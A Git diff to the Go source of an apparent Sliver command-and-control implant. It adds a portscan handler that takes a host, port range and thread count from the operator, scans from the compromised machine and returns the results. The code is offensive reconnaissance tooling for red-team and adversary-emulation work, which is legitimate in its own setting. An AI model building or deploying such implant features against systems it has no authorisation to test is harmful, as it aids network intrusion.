@@ -29,6 +29,7 @@ import (
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/netstat"
+	"github.com/bishopfox/sliver/implant/sliver/portscan"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/ps"
 	"github.com/bishopfox/sliver/implant/sliver/screen"
@@ -266,6 +267,29 @@ func netstatHandler(data []byte, resp RPCResponse) {
 		data, err := proto.Marshal(result)
 		resp(data, err)
 	}
+}
+
+func portscanHandler(data []byte, resp RPCResponse) {
+	portscanReq := &sliverpb.PortscanReq{}
+	err := proto.Unmarshal(data, portscanReq)
+
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	output, err := portscan.Scan(portscanReq.Host, portscanReq.Port, portscanReq.Threads)
+	if err != nil {
+		log.Printf(err.Error())
+		return
+	}
+
+	portscan := &sliverpb.Portscan{Output: output}
+
+	data, err = proto.Marshal(portscan)
+	resp(data, err)
 }
 
 func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
